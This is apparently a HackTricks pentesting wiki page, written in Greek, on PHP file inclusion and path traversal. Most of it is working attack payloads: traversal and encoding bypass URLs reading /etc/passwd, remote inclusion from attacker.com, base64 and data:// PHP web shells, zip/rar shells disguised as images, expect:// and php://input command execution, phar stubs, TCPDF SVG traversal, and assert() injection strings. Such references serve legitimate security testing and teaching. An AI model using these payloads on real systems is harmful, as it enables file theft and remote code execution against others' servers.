# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Το αρχείο φορτώνεται από έναν απομακρυσμένο server (Καλύτερο: μπορείς να γράψεις κώδικα και ο server θα τον εκτελέσει). Στο php αυτό είναι **απενεργοποιημένο** από προεπιλογή (**allow_url_include**).\
**Local File Inclusion (LFI):** Ο server φορτώνει ένα τοπικό αρχείο.

Η ευπάθεια εμφανίζεται όταν ο χρήστης μπορεί με κάποιον τρόπο να ελέγξει το αρχείο που πρόκειται να φορτώσει ο server.

Ευάλωτες **PHP functions**: require, require_once, include, include_once

Ένα ενδιαφέρον εργαλείο για να εκμεταλλευτείτε αυτή την ευπάθεια: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Συνδυάζοντας διάφορες *nix LFI λίστες και προσθέτοντας περισσότερες διαδρομές δημιούργησα αυτήν:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Δοκίμασε επίσης να αλλάξεις `/` με `\`  
Δοκίμασε επίσης να προσθέσεις `../../../../../`

Μία λίστα που χρησιμοποιεί διάφορες τεχνικές για να βρει το αρχείο /etc/password (για να ελέγξετε αν υπάρχει η ευπάθεια) μπορεί να βρεθεί [εδώ](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Συνδυασμός διαφορετικών wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Δοκίμασε επίσης να αλλάξεις `/` με `\`  
Δοκίμασε επίσης να αφαιρέσεις `C:/` και να προσθέσεις `../../../../../`

Μία λίστα που χρησιμοποιεί διάφορες τεχνικές για να βρει το αρχείο /boot.ini (για να ελέγξετε αν υπάρχει η ευπάθεια) μπορεί να βρεθεί [εδώ](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Δες τη λίστα LFI του linux.

## Βασικά LFI και bypasses

All the examples are for Local File Inclusion but could be applied to Remote File Inclusion also (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### ακολουθίες traversal απογυμνωμένες μη-αναδρομικά
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass την προσθήκη περισσότερων χαρακτήρων στο τέλος της παρεχόμενης συμβολοσειράς (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Αυτό έχει **επιλυθεί από την PHP 5.4**

### **Κωδικοποίηση**

Μπορείτε να χρησιμοποιήσετε μη-τυπικές κωδικοποιήσεις όπως double URL encode (και άλλες):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### HTML-to-PDF SVG/IMG path traversal

Οι σύγχρονες HTML-to-PDF engines (π.χ. **TCPDF** ή wrappers όπως **html2pdf**) αναλύουν άφοβα attacker-provided HTML, SVG, CSS και font URLs, αλλά τρέχουν εντός αξιόπιστων backend δικτύων με πρόσβαση στο filesystem. Αφού καταφέρετε να εισάγετε HTML στο `$pdf->writeHTML()`/`Html2Pdf::writeHTML()`, συχνά μπορείτε να exfiltrate τοπικά αρχεία που μπορεί να διαβάσει ο λογαριασμός του web server.

- **Fingerprint the renderer**: every generated PDF contains a `Producer` field (e.g. `TCPDF 6.8.2`). Η γνώση του ακριβούς build σας λέει ποια path filters υπάρχουν και αν γίνεται URL decoding πριν από την επικύρωση.
- **Inline SVG payloads**: `TCPDF::startSVGElementHandler()` reads the `xlink:href` attribute from `<image>` elements before running `urldecode()`. Η ενσωμάτωση ενός κακόβουλου SVG μέσα σε data URI κάνει πολλούς HTML sanitizers να αγνοούν το payload, ενώ το TCPDF εξακολουθεί να το αναλύει:
```
<img src="data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMCAwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxpbWFnZSB4bGluazpocmVmPSIuLi8uLi8uLi8uLi8uLi90bXAvdXNlcl9maWxlcy91c2VyXzEvcHJpdmF0ZV9pbWFnZS5wbmciIGhlaWdodD0iMTAwJSIgd2lkdGg9IjEwMCUiLz48L3N2Zz4=" />
```
TCPDF προθέτει `$_SERVER['DOCUMENT_ROOT']` σε διαδρομές που αρχίζουν με `/` και επιλύει τα `..` μόνο αργότερα, οπότε χρησιμοποιήστε είτε τμήματα που ξεκινούν με `../../..` είτε `/../../..` για να ξεφύγετε από τη ρίζα μετά την προσθήκη.
- **Κωδικοποίηση για παράκαμψη απλοϊκών φίλτρων**: Οι εκδόσεις ≤6.8.2 ελέγχουν μόνο για την κυριολεκτική υποαλυσίδα `../` *πριν* την αποκωδικοποίηση του URL. Η αποστολή `..%2f` (ή `..%2F`) στο SVG ή σε ακατέργαστο `<img src>` attribute παρακάμπτει τον έλεγχο, επειδή η ακολουθία traversal dot-dot-slash αναδημιουργείται μόνο αφού το TCPDF καλέσει `urldecode()`.
- **Διπλή κωδικοποίηση για αποκωδικοποίηση πολλαπλών σταδίων**: Αν η είσοδος χρήστη αποκωδικοποιείται από το web framework *και* από το TCPDF, διπλοκωδικοποιήστε το slash (`%252f`). Μία αποκωδικοποίηση το μετατρέπει σε `%2f`, η δεύτερη αποκωδικοποίηση στο TCPDF το μετατρέπει σε `/`, παράγοντας `/..%252f..` → `/../../../…` χωρίς ποτέ να εμφανίζει `../` στον πρώιμο φίλτρο.
- **HTML `<img>` χειριστής**: `TCPDF::openHTMLTagHandler()` περιέχει το ίδιο bug στη σειρά λειτουργιών, επιτρέποντας απευθείας HTML payloads όπως `src="%2f..%252f..%252ftmp%252fsecret.png"` να διαβάσουν οποιοδήποτε τοπικά προσπελάσιμο bitmap.

Αυτή η τεχνική leaks οτιδήποτε μπορεί να διαβαστεί από τον PDF worker (σαρώσεις διαβατηρίων, API keys παρουσιασμένα ως εικόνες, κ.λπ.). Οι Hardeners το διόρθωσαν στην 6.9.1 με την κανονικοποίηση των διαδρομών (`isRelativePath()`), οπότε κατά τις δοκιμές προτιμήστε παλαιότερες εκδόσεις του `Producer`.

### Από υπάρχον φάκελο

Ίσως το back-end ελέγχει τη διαδρομή του φακέλου:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Εξερεύνηση File System Directories σε Server

Το file system ενός server μπορεί να εξερευνηθεί αναδρομικά για να εντοπιστούν directories, όχι μόνο files, χρησιμοποιώντας ορισμένες τεχνικές. Αυτή η διαδικασία περιλαμβάνει τον προσδιορισμό του directory depth και την ανίχνευση για την ύπαρξη συγκεκριμένων folders. Παρακάτω ακολουθεί μια λεπτομερής μέθοδος για να το επιτύχετε:

1. **Determine Directory Depth:** Καθορίστε το directory depth του τρέχοντος directory σας ανακτώντας επιτυχώς το `/etc/passwd` αρχείο (εφαρμόσιμο αν ο server είναι Linux-based). Ένα παράδειγμα URL μπορεί να είναι δομημένο ως εξής, υποδεικνύοντας depth = 3:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Έλεγχος Φακέλων:** Προσθέστε το όνομα του ύποπτου φακέλου (π.χ., `private`) στο URL, στη συνέχεια επιστρέψτε στο `/etc/passwd`. Το επιπλέον επίπεδο καταλόγου απαιτεί την αύξηση του βάθους κατά ένα:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Ερμηνεία των Αποτελεσμάτων:** Η απάντηση του διακομιστή δείχνει αν ο φάκελος υπάρχει:
- **Σφάλμα / Καμία Έξοδος:** Ο φάκελος `private` πιθανότατα δεν υπάρχει στη συγκεκριμένη τοποθεσία.
- **Περιεχόμενο του `/etc/passwd`:** Η παρουσία του φακέλου `private` επιβεβαιώνεται.
4. **Αναδρομική Εξερεύνηση:** Οι ανακαλυφθέντες φάκελοι μπορούν να διερευνηθούν περαιτέρω για υποκαταλόγους ή αρχεία χρησιμοποιώντας την ίδια τεχνική ή τις παραδοσιακές μεθόδους Local File Inclusion (LFI).

Για την εξερεύνηση καταλόγων σε διαφορετικές τοποθεσίες στο σύστημα αρχείων, προσαρμόστε ανάλογα το payload. Για παράδειγμα, για να ελέγξετε αν το `/var/www/` περιέχει έναν φάκελο `private` (υποθέτοντας ότι ο τρέχων κατάλογος βρίσκεται σε βάθος 3), χρησιμοποιήστε:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Το Path Truncation είναι μια μέθοδος που χρησιμοποιείται για τη χειραγώγηση διαδρομών αρχείων σε web εφαρμογές. Συχνά χρησιμοποιείται για την πρόσβαση σε περιορισμένα αρχεία παρακάμπτοντας ορισμένα μέτρα ασφαλείας που προσθέτουν επιπλέον χαρακτήρες στο τέλος των διαδρομών αρχείων. Ο στόχος είναι να κατασκευαστεί μια διαδρομή αρχείου που, όταν μεταβληθεί από το μέτρο ασφαλείας, εξακολουθεί να δείχνει στο επιθυμητό αρχείο.

Στο PHP, διάφορες αναπαραστάσεις μιας διαδρομής αρχείου μπορούν να θεωρηθούν ισοδύναμες λόγω της φύσης του συστήματος αρχείων. Για παράδειγμα:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` are all treated as the same path.
- Όταν οι τελευταίοι 6 χαρακτήρες είναι `passwd`, η προσθήκη ενός `/` (κάνοντάς το `passwd/`) δεν αλλάζει το στοχευόμενο αρχείο.
- Ομοίως, αν προστεθεί `.php` σε μια διαδρομή αρχείου (π.χ. `shellcode.php`), η προσθήκη ενός `/.` στο τέλος δεν θα αλλάξει το αρχείο που προσπελαύνεται.

Τα παραδείγματα που ακολουθούν δείχνουν πώς να χρησιμοποιήσετε το Path Truncation για πρόσβαση στο `/etc/passwd`, έναν συνηθισμένο στόχο λόγω του ευαίσθητου περιεχομένου του (πληροφορίες λογαριασμών χρηστών):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Σε αυτά τα σενάρια, ο αριθμός των traversals που απαιτούνται μπορεί να είναι περίπου 2027, αλλά αυτός ο αριθμός μπορεί να διαφέρει ανάλογα με τη διαμόρφωση του διακομιστή.

- **Χρήση dot segments και επιπλέον χαρακτήρων**: Οι ακολουθίες traversal (`../`) σε συνδυασμό με επιπλέον dot segments και χαρακτήρες μπορούν να χρησιμοποιηθούν για να πλοηγηθούν στο σύστημα αρχείων, αγνοώντας ουσιαστικά τις συμβολοσειρές που προσθέτει ο διακομιστής.
- **Καθορισμός του απαιτούμενου αριθμού traversals**: Μέσω δοκιμής και σφάλματος, μπορεί κανείς να βρει τον ακριβή αριθμό ακολουθιών `../` που χρειάζονται για να φτάσει στο root directory και στη συνέχεια στο `/etc/passwd`, εξασφαλίζοντας ότι τυχόν προσαρτημένες συμβολοσειρές (όπως `.php`) εξουδετερώνονται ενώ η επιθυμητή διαδρομή (`/etc/passwd`) παραμένει ανέπαφη.
- **Έναρξη με ψεύτικο κατάλογο**: Είναι κοινή πρακτική να ξεκινά η διαδρομή με έναν ανύπαρκτο κατάλογο (π.χ. `a/`). Αυτή η τεχνική χρησιμοποιείται ως μέτρο προφύλαξης ή για να ικανοποιήσει τις απαιτήσεις της λογικής ανάλυσης διαδρομών του διακομιστή.

Όταν εφαρμόζετε path truncation techniques, είναι κρίσιμο να κατανοήσετε τη συμπεριφορά ανάλυσης διαδρομών του διακομιστή και τη δομή του συστήματος αρχείων. Κάθε σενάριο μπορεί να απαιτεί διαφορετική προσέγγιση, και συχνά χρειάζονται δοκιμές για να βρεθεί η πιο αποτελεσματική μέθοδος.

**Αυτή η ευπάθεια διορθώθηκε στο PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

Στο php αυτό είναι απενεργοποιημένο από προεπιλογή επειδή **`allow_url_include`** είναι **Off.** Πρέπει να είναι **On** για να λειτουργήσει, και σε αυτή την περίπτωση μπορείτε να συμπεριλάβετε ένα PHP αρχείο από τον server σας και να αποκτήσετε RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Εάν για κάποιο λόγο **`allow_url_include`** είναι **On**, αλλά η **PHP** κάνει **filtering** στην πρόσβαση σε εξωτερικές ιστοσελίδες, [σύμφωνα με αυτήν την ανάρτηση](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), μπορείτε, για παράδειγμα, να χρησιμοποιήσετε το πρωτόκολλο data με base64 για να αποκωδικοποιήσετε έναν b64 PHP κώδικα και να αποκτήσετε RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Στον προηγούμενο κώδικα, το τελικό `+.txt` προστέθηκε επειδή ο επιτιθέμενος χρειαζόταν μια συμβολοσειρά που να τελειώνει σε `.txt`, έτσι η συμβολοσειρά τελειώνει με αυτό και μετά την b64 decode εκείνο το μέρος θα επιστρέψει απλά σκουπίδια και ο πραγματικός PHP κώδικας θα συμπεριληφθεί (και συνεπώς, θα εκτελεστεί).

Ένα άλλο παράδειγμα **χωρίς χρήση του `php://` πρωτοκόλλου** θα ήταν:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Root στοιχείο

Στον python, σε κώδικα σαν τον παρακάτω:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Αν ο χρήστης περάσει ένα **απόλυτο μονοπάτι** στο **`file_name`**, το **προηγούμενο μονοπάτι απλά αφαιρείται**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Αυτή είναι η αναμενόμενη συμπεριφορά σύμφωνα με [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Εάν ένα τμήμα είναι απόλυτη διαδρομή, όλα τα προηγούμενα τμήματα απορρίπτονται και η σύνδεση συνεχίζεται από το απόλυτο τμήμα διαδρομής.

## Java Λίστα Καταλόγων

Φαίνεται ότι αν έχετε ένα Path Traversal σε Java και **ζητήσετε έναν κατάλογο** αντί για αρχείο, επιστρέφεται **λίστα με το περιεχόμενο του καταλόγου**. Αυτό δεν συμβαίνει σε άλλες γλώσσες (afaik).

## Top 25 παράμετροι

Εδώ είναι η λίστα με τις Top 25 παραμέτρους που θα μπορούσαν να είναι ευάλωτες σε local file inclusion (LFI) (από [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI με χρήση PHP wrappers & protocols

### php://filter

PHP filters allow perform basic **ενεργειών τροποποίησης στα δεδομένα** before being it's read or written. There are 5 categories of filters:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Αφαιρεί tags από τα δεδομένα (ό,τι βρίσκεται ανάμεσα στους χαρακτήρες "<" και ">")
- Σημειώστε ότι αυτό το φίλτρο έχει εξαφανιστεί από τις σύγχρονες εκδόσεις του PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Μετατρέπει σε διαφορετική κωδικοποίηση (`convert.iconv.<input_enc>.<output_enc>`). Για να λάβετε τη **λίστα όλων των κωδικοποιήσεων** που υποστηρίζονται, εκτελέστε στην κονσόλα: `iconv -l`

> [!WARNING]
> Καταχρηστική χρήση του φίλτρου μετατροπής `convert.iconv.*` μπορεί να σας επιτρέψει να **παράγετε αυθαίρετο κείμενο**, το οποίο μπορεί να είναι χρήσιμο για να γράψετε αυθαίρετο κείμενο ή να κάνετε μια συνάρτηση όπως το include να επεξεργαστεί αυθαίρετο κείμενο. Για περισσότερες πληροφορίες δείτε [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Συμπιέζει το περιεχόμενο (χρήσιμο αν χρειάζεται να εξάγετε μεγάλη ποσότητα πληροφοριών)
- `zlib.inflate`: Αποσυμπιέζει τα δεδομένα
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Καταργημένο
- `mdecrypt.*` : Καταργημένο
- Other Filters
- Εκτελώντας στο php `var_dump(stream_get_filters());` μπορείτε να βρείτε μερικά **μη αναμενόμενα φίλτρα**:
- `consumed`
- `dechunk`: reverses HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Το μέρος "php://filter" δεν κάνει διάκριση πεζών/κεφαλαίων

### Using php filters as oracle to read arbitrary files

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) προτείνεται μια τεχνική για ανάγνωση ενός local αρχείου χωρίς η έξοδος να επιστραφεί από τον server. Η τεχνική βασίζεται σε ένα **boolean exfiltration of the file (char by char) using php filters** ως oracle. Αυτό συμβαίνει επειδή τα php filters μπορούν να χρησιμοποιηθούν για να κάνουν ένα κείμενο αρκετά μεγάλο ώστε το php να ρίξει ένα exception.

Στο original post θα βρείτε λεπτομερή εξήγηση της τεχνικής, αλλά εδώ είναι μια σύντομη περίληψη:

- Use the codec **`UCS-4LE`** για να αφήσει τον οδηγό χαρακτήρα του κειμένου στην αρχή και να κάνει το μέγεθος της συμβολοσειράς να αυξάνεται εκθετικά.
- Αυτό θα χρησιμοποιηθεί για να παραχθεί ένα **text so big when the initial letter is guessed correctly** που το php θα προκαλέσει ένα **error**
- Το φίλτρο **dechunk** θα **remove everything if the first char is not an hexadecimal**, οπότε μπορούμε να γνωρίζουμε αν ο πρώτος χαρακτήρας είναι hex.
- Αυτό, σε συνδυασμό με το προηγούμενο (και άλλα φίλτρα ανάλογα με το μαντευμένο γράμμα), θα μας επιτρέψει να μαντέψουμε έναν χαρακτήρα στην αρχή του κειμένου βλέποντας πότε εφαρμόζουμε αρκετές μετασχηματίσεις ώστε να μην είναι πλέον hexadecimal χαρακτήρας. Διότι αν είναι hex, το dechunk δεν θα τον διαγράψει και η αρχική βόμβα θα κάνει php error.
- Ο codec **convert.iconv.UNICODE.CP930** μετασχηματίζει κάθε γράμμα στο επόμενο (οπότε μετά από αυτόν τον codec: a -> b). Αυτό μας επιτρέπει να ανακαλύψουμε αν ο πρώτος χαρακτήρας είναι `a` για παράδειγμα, γιατί αν εφαρμόσουμε 6 φορές αυτόν τον codec a->b->c->d->e->f->g ο χαρακτήρας δεν είναι πια hexadecimal, επομένως το dechunk δεν τον διαγράφει και το php error ενεργοποιείται επειδή πολλαπλασιάζεται με την αρχική βόμβα.
- Χρησιμοποιώντας άλλους μετασχηματισμούς όπως **rot13** στην αρχή, είναι δυνατή η leak άλλων χαρακτήρων όπως n, o, p, q, r (και άλλοι codecs μπορούν να χρησιμοποιηθούν για να μετακινήσουν άλλα γράμματα στο hex εύρος).
- Όταν ο αρχικός χαρακτήρας είναι αριθμός χρειάζεται να τον base64 encode και να leak τα 2 πρώτα γράμματα για να leak τον αριθμό.
- Το τελικό πρόβλημα είναι να δούμε **how to leak more than the initial letter**. Χρησιμοποιώντας order memory filters όπως **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** είναι δυνατό να αλλάξουμε τη σειρά των χαρακτήρων και να φέρουμε στην πρώτη θέση άλλα γράμματα του κειμένου.
- Και για να μπορέσουμε να αποκτήσουμε **further data** η ιδέα είναι να **generate 2 bytes of junk data at the beginning** με **convert.iconv.UTF16.UTF16**, να εφαρμόσουμε **UCS-4LE** για να το **pivot with the next 2 bytes**, και **delete the data until the junk data** (αυτό θα αφαιρέσει τα πρώτα 2 bytes του αρχικού κειμένου). Συνεχίστε έτσι μέχρι να φτάσετε το επιθυμητό bit για να leak.

Στο post δόθηκε επίσης ένα εργαλείο για αυτόματη εκτέλεση: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Αυτός ο wrapper επιτρέπει την πρόσβαση σε file descriptors που η διαδικασία έχει ανοιχτά. Ενδεχομένως χρήσιμο για να exfiltrate το περιεχόμενο ανοικτών αρχείων:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Μπορείτε επίσης να χρησιμοποιήσετε **php://stdin, php://stdout and php://stderr** για να αποκτήσετε πρόσβαση στα **file descriptors 0, 1 and 2** αντίστοιχα (δεν είμαι σίγουρος πώς αυτό θα μπορούσε να είναι χρήσιμο σε μια επίθεση)

### zip:// and rar://

Ανεβάστε ένα Zip ή Rar αρχείο με ένα PHPShell μέσα και αποκτήστε πρόσβαση σε αυτό.\
Για να μπορείτε να καταχραστείτε το rar protocol, χρειάζεται να **ενεργοποιηθεί συγκεκριμένα**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Σημειώστε ότι αυτό το πρωτόκολλο περιορίζεται από τις ρυθμίσεις του php **`allow_url_open`** και **`allow_url_include`**

### expect://

Το Expect πρέπει να είναι ενεργοποιημένο. Μπορείτε να εκτελέσετε κώδικα χρησιμοποιώντας αυτό:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Καταχωρίστε το payload σας στις παραμέτρους POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Ένα αρχείο `.phar` μπορεί να χρησιμοποιηθεί για την εκτέλεση PHP κώδικα όταν μια web εφαρμογή αξιοποιεί συναρτήσεις όπως `include` για φόρτωση αρχείων. Το παρακάτω απόσπασμα κώδικα PHP δείχνει τη δημιουργία ενός αρχείου `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Για να μεταγλωττιστεί το αρχείο `.phar`, πρέπει να εκτελεστεί η ακόλουθη εντολή:
```bash
php --define phar.readonly=0 create_path.php
```
Κατά την εκτέλεση, θα δημιουργηθεί ένα αρχείο με όνομα `test.phar`, το οποίο ενδέχεται να αξιοποιηθεί για την εκμετάλλευση ευπαθειών Local File Inclusion (LFI).

Σε περιπτώσεις όπου το LFI απλώς διαβάζει αρχεία χωρίς να εκτελεί τον PHP κώδικα που περιέχουν, μέσω συναρτήσεων όπως `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ή `filesize()`, μπορεί να επιχειρηθεί εκμετάλλευση ευπάθειας αποσειριοποίησης. Αυτή η ευπάθεια σχετίζεται με την ανάγνωση αρχείων χρησιμοποιώντας το πρωτόκολλο `phar`.

Για λεπτομερή κατανόηση της εκμετάλλευσης ευπαθειών αποσειριοποίησης στο πλαίσιο αρχείων `.phar`, ανατρέξτε στο έγγραφο που παρατίθεται παρακάτω:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Ήταν δυνατό να καταχραστεί **any arbitrary file read from PHP that supports php filters** για να αποκτηθεί RCE. Η λεπτομερής περιγραφή μπορεί να [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Πολύ σύντομη περίληψη: ένας **3 byte overflow** στον PHP heap εκμεταλλεύτηκε για να **alter the chain of free chunks** συγκεκριμένου μεγέθους, ώστε να είναι δυνατή η **write anything in any address**, οπότε προστέθηκε ένα hook για να καλεί **`system`**.\
Ήταν δυνατό να alloc chunks συγκεκριμένων μεγεθών καταχρώμενοι περισσότερα php filters.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Εγγραφή στη μνήμη ή σε προσωρινό αρχείο (δεν είναι σαφές πώς αυτό μπορεί να είναι χρήσιμο σε επίθεση file inclusion)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Πρόσβαση στο τοπικό filesystem
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Πρόσβαση σε HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Πρόσβαση σε FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Ροές συμπίεσης
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Εύρεση μονοπατιών που ταιριάζουν με πρότυπο (Δεν επιστρέφει τίποτα εκτυπώσιμο, οπότε δεν είναι πραγματικά χρήσιμο εδώ)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Ροές ήχου (Δεν είναι χρήσιμο για ανάγνωση αυθαίρετων αρχείων)

## LFI μέσω του PHP 'assert'

Οι κίνδυνοι Local File Inclusion (LFI) στο PHP είναι ιδιαίτερα υψηλοί όταν έχουμε να κάνουμε με τη συνάρτηση 'assert', η οποία μπορεί να εκτελέσει κώδικα μέσα σε συμβολοσειρές. Αυτό είναι ιδιαιτέρως προβληματικό αν γίνεται έλεγχος εισόδου που περιέχει χαρακτήρες directory traversal όπως ".." αλλά δεν γίνεται σωστή απολύμανση.

Για παράδειγμα, ο PHP κώδικας μπορεί να έχει σχεδιαστεί για να αποτρέπει directory traversal ως εξής:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Ενώ αυτό στοχεύει στο να σταματήσει το traversal, δημιουργεί ακούσια ένα vector για code injection. Για να το εκμεταλλευτεί για να διαβάσει το περιεχόμενο ενός αρχείου, ένας attacker θα μπορούσε να χρησιμοποιήσει:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Παρομοίως, για την εκτέλεση αυθαίρετων εντολών συστήματος, κάποιος μπορεί να χρησιμοποιήσει:
```plaintext
' and die(system("id")) or '
```
